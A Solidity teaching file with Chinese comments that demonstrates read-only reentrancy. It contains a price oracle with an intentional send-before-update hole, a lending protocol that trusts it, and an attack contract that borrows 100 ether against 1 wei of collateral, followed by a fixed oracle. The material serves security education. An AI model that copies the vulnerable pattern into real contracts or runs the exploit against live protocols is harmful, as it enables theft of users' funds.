// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/// @title PriceOracle
/// @notice 含提款功能的 Oracle — withdraw 先转账后更新，导致 read-only 重入
contract PriceOracle {
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    /// @notice 看起来无害的 view 函数 — 在 reentrancy 时读到中间态
    /// @dev price = totalDeposits/balance；withdraw 时 balance 已减、totalDeposits 未减 → 价格虚高
    function getPrice() external view returns (uint256) {
        if (address(this).balance == 0) return 1e18;
        return totalDeposits * 1e18 / address(this).balance;
    }

    function withdraw(uint256 amt) external {
        require(deposits[msg.sender] >= amt);

        // 先转账 → 触发 receive()
        // slither-disable-next-line reentrancy-eth -- intentional: demo of read-only reentrancy
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);

        // 后更新 totalDeposits — 中间态窗口在这里
        deposits[msg.sender] -= amt;
        totalDeposits -= amt;
    }
}

/// @title LendingProtocol
/// @notice 信任 oracle 的借贷协议 — borrow 时调用 getPrice()
contract LendingProtocol {
    PriceOracle public oracle;
    mapping(address => uint256) public borrowed;

    constructor(address _oracle) {
        oracle = PriceOracle(_oracle);
    }

    receive() external payable {}

    function borrow(uint256 amount) external payable {
        uint256 price = oracle.getPrice();
        uint256 collateralValue = msg.value * price / 1e18;

        require(collateralValue >= amount * 150 / 100, "undercollateralized");

        borrowed[msg.sender] += amount;
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok);
    }
}

/// @title ReadOnlyAttack
/// @notice 利用 read-only 重入：receive 时 getPrice 读到 totalDeposits 未更新的中间态
contract ReadOnlyAttack {
    PriceOracle public oracle;
    LendingProtocol public lender;
    bool private _attacked;

    constructor(address _o, address _l) {
        oracle = PriceOracle(_o);
        lender = LendingProtocol(payable(_l));
    }

    /// @dev 存入 150 ether，提款 150 ether - 1 wei，使 oracle 余额=1 wei、totalDeposits 未减
    function attack() external payable {
        oracle.deposit{value: msg.value}();
        oracle.withdraw(msg.value - 1);
    }

    receive() external payable {
        if (!_attacked) {
            _attacked = true;
            // 此时：oracle 的 ETH 已转出，但 totalDeposits 还没减少
            // price = totalDeposits/balance 虚高 → 1 wei 可冒充高抵押
            lender.borrow{value: 1}(100 ether);
        }
    }
}

/// @title SafePriceOracle
/// @notice 修复：withdraw 严格遵守 CEI
contract SafePriceOracle {
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function getPrice() external view returns (uint256) {
        if (address(this).balance == 0) return 1e18;
        return totalDeposits * 1e18 / address(this).balance;
    }

    function withdraw(uint256 amt) external {
        require(deposits[msg.sender] >= amt);
        deposits[msg.sender] -= amt;
        totalDeposits -= amt;
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
    }
}
